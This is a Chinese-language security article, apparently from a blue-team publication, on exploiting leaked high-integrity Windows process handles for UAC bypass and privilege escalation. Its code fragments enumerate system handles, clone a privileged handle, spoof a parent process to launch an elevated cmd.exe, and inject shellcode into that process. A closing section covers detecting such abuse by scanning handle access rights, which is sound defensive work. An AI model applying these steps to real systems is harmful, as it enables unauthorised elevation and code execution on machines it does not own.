## **背景**  

在先前的蓝军技术推送中，曾分享过一篇关于泄露句柄利用的技术文章。文中通过在非特权进程中寻找泄露句柄，利用其中的高完整性句柄实现UAC
Bypass的技术。本文将就其实现原理与其在终端对抗和威胁狩猎中的应用进行分析阐述。

##  **01** Handle与Token

Windows访问令牌Token是在用户登录Windows并通过身份认证后，由本地安全机构LSA创建的，与此同时，还会创建新的登录会话。每个进程都会对应一个访问令牌并关联一个登录会话，令牌中包含着用户安全标识符(SID)、对应权限等信息。Windows会检查访问内核对象的线程的Token以确定其访问权限，此即Windows特权模型：

特权令牌用作进程访问凭证，需要经过SeAccessCheck评估其令牌完整性级别，然后评估其自由访问控制列表DACL，确定是否可以授予请求的访问权限。在特权操作期间，进程通过SeSinglePrivilegeCheck检查传递的权限值。由此便引申出了窃取Token令牌的攻击手法：攻击者通过获取特权Token，复制该Token，并利用其创建进程，使进程也拥有相应权限。利用链如下：

1.通过LookupPrivilegeValue获取TOKEN_PRIVILEGES结构体：

    
    
    BOOL LookupPrivilegeValueA(  
    [in]    LPCSTR lpSystemName,    // 寻找特权信息的目标系统，本地系统为NULL  
    [in]    LPCSTR lpName,      //特权值名称  
    [out]    PLUID  lpLuid       //返回记录着特权信息的LUID结构体  
    );

通过PLUID结构获取系统上的特权并判断其权限。一般而言，常被滥用的特权有以下几种：

SeDebugPrivilege：跳过对访问内核对象线程的检查

SeCreateTokenPriviliege：创建令牌特权

SeLoadDriverPrivilege：驱动加载特权

SeRestorePrivilege：恢复文件或目录（无视文件ACL的任意文件写访问特权）  
SeBackupPrivilege：备份文件或目录（无视文件ACL的任意文件读访问特权）

SeTakeOwnershipPrivilege：获取对象所有权

SeTcbPrivilege：标识对象为受信任计算机库的一部分

2.通过OpenProcess打开特权进程并获取对应句柄

3.利用DuplicateToken复制令牌

4.调用CreateProcessWithTokenW启动进程

关于Handle，Windows是一个基于对象的系统，进程、线程、互斥体等实体在内核中以一种对象数据结构的形式存在，如进程对象_EPROCESS。作为内核空间的数据，普通用户模式的代码无法直接与撰写数据结构进行交互。因此Windows引入了句柄Handle，这是用于与内核进行间接数据交互的机制。Handle是内核空间表中的一个索引，它对于每个进程而言都是私有的。表中的每条记录都包含其指向的对象地址以及句柄所代表的对象的访问级别。下面代码通过底层API
NtQuerySystemInformation获取系统中的Handle信息：

    
    
    NTSTATUS status;  
    PSYSTEM_HANDLE_INFORMATION_EX handleInfoEx;  
    ULONG handleInfoSizeEx = 0x10000;  
    handleInfoEx = (PSYSTEM_HANDLE_INFORMATION_EX) malloc(handleInfoSizeEx);  
      
    while ((status = NtQuerySystemInformation(  
    SystemExtendedHandleInformation,  
    handleInfoEx,  
    handleInfoSizeEx,  
    NULL  
    )) == STATUS_INFO_LENGTH_MISMATCH) {  
    handleInfoEx = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(handleInfoEx, handleInfoSizeEx *= 2);  
    if (handleInfoEx == NULL)  
    break;   
    }

记录Handle信息的结构体如下：

    
    
    typedef struct _SYSTEM_HANDLE_INFORMATION{  
    ULONG ProcessId;    //进程标识符  
    UCHAR ObjectTypeNumber;//打开的对象的类型  
    UCHAR Flags;        //句柄属性标志  
    USHORT Handle;    //句柄数值,在进程打开的句柄中唯一标识某个句柄  
    PVOID Object;    //句柄对应的EPROCESS的地址  
    ACCESS_MASK GrantedAccess;//句柄对象的访问权限  
    } SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

其中的GrantedAccess字段便记录着句柄对象相应的访问权限。下面是获取到的部分信息：

![1652175189_627a315563bb38bfd44c2.png!small?1652175190676](https://image.3001.net/images/20220510/1652175189_627a315563bb38bfd44c2.png!small?1652175190676)

如上图所示，其中Access
granted表示的是句柄的属性，而0x1FFFFF即表示PROCESS_ALL_ACCESS。上面的实验说明，任何进程句柄所在的句柄表都可以被轻易访问，获取访问权限信息，进而寻找特权句柄。以下句柄属性都在重点关注范围之内：

    
    
    PROCESS_ALL_ACCESS  
    PROCESS_CREATE_PROCESS  
    PROCESS_CREATE_THREAD  
    PROCESS_DUP_HANDLE  
    PROCESS_VM_WRITE

上面的示例表明，即使是一个低权限进程，也可以无视安全上下文和PP(L)级别获取进程句柄表中的信息。这为Handle的利用与相关恶意行为的狩猎提供了机会。

##  **02** 特权句柄利用

与窃取Token的攻击手法类似，利用句柄克隆，能够轻易地得到具有特权进程访问权限的句柄，利用该句柄启动新进程，并将父进程欺骗为该句柄指向的特权进程，进而使得新进程能够继承父进程的安全Context。在上面的论述中已经阐明获取系统存在的特权句柄的原理，下面进一步阐述特权句柄利用过程。

 **1.打开特权句柄进程并克隆句柄，利用克隆句柄创建进程**

在获取了特权句柄指向进程的PID等信息后：

    
    
    auto hOwner = OpenProcess(PROCESS_DUP_HANDLE, false, ownerPid);  
    auto success = DuplicateHandle(hOwner, (HANDLE)sysHandle.Handle, GetCurrentProcess(), &clonedHandle, NULL, false, DUPLICATE_SAME_ACCESS);

利用DuplicateHandle克隆句柄，以便后续利用。

通过控制克隆的特权句柄生成新进程，将父进程欺骗为句柄指向的特权进程，使得新进程能够继承特权进程的安全上下文。下面以通过父进程打开cmd.exe为例：

    
    
    STARTUPINFOEXW sinfo = { sizeof(sinfo) };  
    PROCESS_INFORMATION pinfo;  
    sinfo.StartupInfo.cb = sizeof(sinfo.StartupInfo);  
    sinfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);  
    InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);  
    InitializeProcThreadAttributeList(sinfo.lpAttributeList, 1, 0, &bytes);  
    UpdateProcThreadAttribute(sinfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &clonedHandle, sizeof(HANDLE), NULL, NULL);  
    std::wstring commandline = L"C:\\Windows\\System32\\cmd.exe";  
    auto success = CreateProcessW(nullptr, &commandline[0], NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, &sinfo.StartupInfo, &pinfo);

若存在可利用的句柄，则通过其克隆句柄创建cmd进程，该进程继承了句柄的高完整性，拥有更高权限的特权。普通cmd进程特权如下：

![1652175256_627a319828d8d8c5f563d.png!small?1652175257356](https://image.3001.net/images/20220510/1652175256_627a319828d8d8c5f563d.png!small?1652175257356)

使用高完整性句柄创建的cmd进程，查看进程特权如下：

![1652175266_627a31a22831a8682878e.png!small?1652175267265](https://image.3001.net/images/20220510/1652175266_627a31a22831a8682878e.png!small?1652175267265)

可以看到，利用特权句柄创建的进程继承了原句柄的高完整性。

 **2.写入shellcode到特权cmd进程执行**

    
    
    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);  
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);  
    bStatus = (BOOL) pRtlCreateUserThread(hProc, NULL, 0, 0, 0, 0, pRemoteCode, NULL, &hThread, NULL);

上面示例通过滥用特权句柄，实现在特权进程中写入代码，并创建线程执行。

##  **03** 实战化利用

从攻击者角度出发，系统中潜在的高完整性句柄可能可以作为UAC Bypass和权限提升的利用手段之一。

在实战攻防中，恶意提权可能会造成其进程对应句柄中存在超出权限的进程。在上面的特权令牌和句柄的检测与利用中，提出了一种针对潜在恶意提权行为的筛查思路。即可以在无需管理员权限的情况下，通过遍历非特权进程中的句柄，筛查权限异常的句柄以捕获潜在的恶意提权操作。

下面演示恶意提权利用与检测过程：

模拟提权程序通过复制已存在的令牌创建新cmd.exe进程：

![1652175282_627a31b28e6d8bbaf39f0.png!small?1652175283639](https://image.3001.net/images/20220510/1652175282_627a31b28e6d8bbaf39f0.png!small?1652175283639)

进程号为4488：

![1652175291_627a31bb2f8ef30676233.png!small?1652175292279](https://image.3001.net/images/20220510/1652175291_627a31bb2f8ef30676233.png!small?1652175292279)

遍历非特权进程中的句柄并比对其权限信息，发现异常句柄：

![1652175302_627a31c6b70346114c442.png!small?1652175303809](https://image.3001.net/images/20220510/1652175302_627a31c6b70346114c442.png!small?1652175303809)

如上图所示，句柄权限为0x12019F，在WinDbg中查询结果如下：

![1652175312_627a31d0d2c6b167210b8.png!small?1652175314007](https://image.3001.net/images/20220510/1652175312_627a31d0d2c6b167210b8.png!small?1652175314007)

可以看到，句柄完整性很高。而拥有此句柄的4488进程信息如下：

![1652175318_627a31d6ac14580dcbe8e.png!small?1652175319762](https://image.3001.net/images/20220510/1652175318_627a31d6ac14580dcbe8e.png!small?1652175319762)

是一个低权进程，这表明该进程可能存在恶意提权操作。

##  **04** 总结

通过对Windows特权句柄的探究：

1.高完整性特权句柄是潜在的可利用对象，在终端防护中值得关注

2.对特权句柄的分析可作为恶意提权行为的一种检测手段

## 参考

Gaining the upper handle

https://aptw.tf/2022/02/10/leaked-handle-hunting.html

LeakedHandlesFinder

https://github.com/lab52io/LeakedHandlesFinder

Leaked Handle Exploitation

https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/leaked-handle-exploitation

  

